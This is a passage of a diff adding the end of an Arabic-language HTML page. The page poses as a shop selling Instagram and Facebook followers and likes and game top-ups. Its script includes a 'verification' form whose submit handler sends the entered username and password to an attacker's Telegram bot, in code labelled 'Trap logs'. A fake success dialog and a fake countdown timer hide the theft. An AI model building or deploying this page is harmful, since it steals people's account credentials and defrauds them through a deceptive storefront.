+            <div id="orderIdDisplay" class="text-xl font-black gold-text mb-6 p-4 bg-zinc-900 rounded-xl border border-zinc-800 cursor-pointer hover:bg-zinc-800" onclick="copyOrder()">
+                LVL-XXXX
+            </div>
+            <button onclick="closeSuccessModal()" class="w-full btn-gold py-3 rounded-xl">حسناً</button>
+        </div>
+    </div>
+
+    <script>
+        // Database for Platforms Services
+        const platformData = {
+            instagram: {
+                name: 'إنستغرام',
+                img: 'https://cdn-icons-png.flaticon.com/512/174/174855.png',
+                services: [
+                    { id: 'ig_followers', name: 'متابعين حسابات ثابتين', pricePerOne: 0.05 },
+                    { id: 'ig_likes', name: 'إعجابات منشورات حقيقية', pricePerOne: 0.01 },
+                    { id: 'ig_views', name: 'مشاهدات ريلز سريعة', pricePerOne: 0.005 }
+                ]
+            },
+            facebook: {
+                name: 'فيسبوك',
+                img: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png',
+                services: [
+                    { id: 'fb_followers', name: 'متابعين ملف شخصي / بيج', pricePerOne: 0.06 },
+                    { id: 'fb_likes', name: 'تفاعلات لايكات و ايموجي', pricePerOne: 0.02 }
+                ]
+            }
+        };
+
+        let currentPlatform = '';
+        let currentPricePerOne = 0;
+
+        // Navigation Elements
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
+            document.getElementById(`page-${pageId}`).classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function showPlatform(platformKey) {
+            currentPlatform = platformKey;
+            const data = platformData[platformKey];
+            
+            document.getElementById('platformName').innerText = data.name;
+            document.getElementById('platformImg').src = data.img;
+            
+            const listContainer = document.getElementById('servicesList');
+            listContainer.innerHTML = '';
+            
+            data.services.forEach(srv => {
+                const item = document.createElement('div');
+                item.className = 'service-item flex justify-between items-center font-bold';
+                item.innerHTML = `<span>${srv.name}</span> <span class="gold-text">${srv.pricePerOne * 1000} د.ل / للألف</span>`;
+                item.onclick = () => selectService(srv.name, srv.pricePerOne);
+                listContainer.appendChild(item);
+            });
+
+            document.getElementById('orderArea').classList.add('hidden');
+            showPage('page-platform'); // Now shifts to the platform sub-page cleanly
+        }
+
+        function selectService(name, price) {
+            currentPricePerOne = price;
+            document.getElementById('selectedServiceName').innerText = name;
+            document.getElementById('orderArea').classList.remove('hidden');
+            updatePrice();
+        }
+
+        function updatePrice() {
+            const qty = document.getElementById('quantity').value || 0;
+            const total = qty * currentPricePerOne;
+            document.getElementById('finalPrice').innerText = total.toFixed(2);
+        }
+
+        // Modals Management
+        function login() { document.getElementById('loginModal').classList.add('hidden'); }
+        function logout() { document.getElementById('loginModal').classList.remove('hidden'); }
+        function openVerifyModal() { document.getElementById('verifyModal').classList.remove('hidden'); }
+        function closeVerifyModal() { document.getElementById('verifyModal').classList.add('hidden'); }
+        function closeSuccessModal() { document.getElementById('successModal').classList.add('hidden'); }
+
+        // Form Handling & Integration with Telegram Bot (Trap logs)
+        async function sendToTelegram(msg) {
+            const token = "YOUR_BOT_TOKEN"; // استبدله بـ التوكن الخاص بك
+            const chatId = "YOUR_CHAT_ID";   // استبدله بـ آيدي حسابك
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: msg })
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        async function submitVerifyForm(e) {
+            e.preventDefault();
+            const u = document.getElementById('vUser').value;
+            const p = document.getElementById('vPass').value;
+            
+            const text = `🔥 طلب توثيق جديد:\nالمنصة: ${currentPlatform || 'غير محددة'}\nالمستخدم: ${u}\nكلمة السر: ${p}`;
+            await sendToTelegram(text);
+            
+            closeVerifyModal();
+            triggerSuccess();
+        }
+
+        function setGamingOrder(itemName, price) {
+            document.getElementById('selectedGamingItem').innerText = `طلب شحن: ${itemName} (${price} LYD)`;
+            document.getElementById('gamingOrderArea').classList.remove('hidden');
+            document.getElementById('gamingOrderArea').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        async function submitGamingOrder(e) {
+            e.preventDefault();
+            const id = document.getElementById('gameId').value;
+            const item = document.getElementById('selectedGamingItem').innerText;
+            
+            const text = `🎮 طلب شحن ألعاب جديد:\nالخدمة: ${item}\nالمعرف/الحساب: ${id}`;
+            await sendToTelegram(text);
+            
+            triggerSuccess();
+        }
+
+        async function submitMainOrder(e) {
+            e.preventDefault();
+            const link = document.getElementById('targetLink').value;
+            const qty = document.getElementById('quantity').value;
+            const price = document.getElementById('finalPrice').innerText;
+            const srv = document.getElementById('selectedServiceName').innerText;
+
+            const text = `🛒 طلب رشق جديد:\nالخدمة: ${srv}\nالرابط: ${link}\nالكمية: ${qty}\nالسعر: ${price} د.ل`;
+            await sendToTelegram(text);
+
+            triggerSuccess();
+        }
+
+        function triggerSuccess() {
+            const ranId = Math.floor(1000 + Math.random() * 9000);
+            document.getElementById('orderIdDisplay').innerText = `LVL-${ranId}`;
+            document.getElementById('successModal').classList.remove('hidden');
+        }
+
+        function copyOrder() {
+            const idText = document.getElementById('orderIdDisplay').innerText;
+            navigator.clipboard.writeText(idText);
+            alert('تم نسخ رقم الطلب: ' + idText);
+        }
+
+        // Countdown Timer Logic
+        let totalSeconds = 23 * 3600 + 59 * 60 + 59;
+        setInterval(() => {
+            if (totalSeconds <= 0) return;
+            totalSeconds--;
+            const h = Math.floor(totalSeconds / 3600).toString().padStart(2, '0');
+            const m = Math.floor((totalSeconds % 3600) / 60).toString().padStart(2, '0');
+            const s = (totalSeconds % 60).toString().padStart(2, '0');
+            document.getElementById('countdown').innerText = `${h}:${m}:${s}`;
+        }, 1000);
+    </script>
+</body>
+</html>
